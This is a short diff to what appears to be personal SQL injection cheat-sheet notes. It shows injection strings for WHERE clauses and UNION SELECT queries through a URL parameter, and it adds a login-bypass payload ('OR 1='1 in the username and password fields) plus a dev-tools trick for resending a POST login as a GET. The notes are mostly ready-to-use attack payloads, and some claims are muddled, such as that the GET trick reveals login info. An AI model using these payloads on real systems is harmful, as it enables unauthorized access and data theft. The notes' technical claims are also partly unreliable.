@@ -102,8 +102,10 @@ Injection Example: SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=�
                    Passing injection thru url: prices.php?item=4 UNION SELECT 1,2
                                                prices.php?item=4 UNION SELECT 1,2,@@version  ##For Version
 
-                   
-
+      ID Bypass - Login Page: Username: 'OR 1='1
+                               Pass: 'OR 1='1
+                               f12 --> Network --> Press Login --- A POST Request will be sent, select it, go to Request, copy and paste the RAW to url bar: <url>?<paste>, enter #Turns a POST to GET, gives login info
+                               THIS IS ALL YOU CAN GET FROM A LOGIN PAGE
 
 
 
